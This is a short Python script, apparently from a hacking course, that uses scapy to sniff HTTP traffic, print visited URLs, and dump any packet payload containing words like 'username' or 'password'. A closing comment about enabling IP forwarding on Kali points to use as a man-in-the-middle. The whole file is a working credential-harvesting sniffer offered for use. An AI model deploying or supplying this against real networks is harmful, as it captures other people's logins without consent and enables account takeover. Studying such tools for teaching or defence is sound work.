#! /usr/bin/env python
#import optparse # argparse for newer version
import scapy.all as scapy
# we wil have to use pip install scapy_http to filter http requests
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packets)#, filter="port 80")#filter="udp" # or tcp or arp # it doesnt allow http
    # we wil have to use pip install scapy_http to filter http requests

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "password", "pass"]
        for i in keywords:
            if i in load:
                print("\n\n[+] Possible username/password >>>>>>\t" + packet[scapy.Raw].load + "\n\n")
                break

def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>>>>>\t"+url)
        get_login(packet)
    # print(packet)

sniff("etho")


#todo ~echo 1 > /proc/sys/net/ipv4/ip_forward to allow kali forward the requests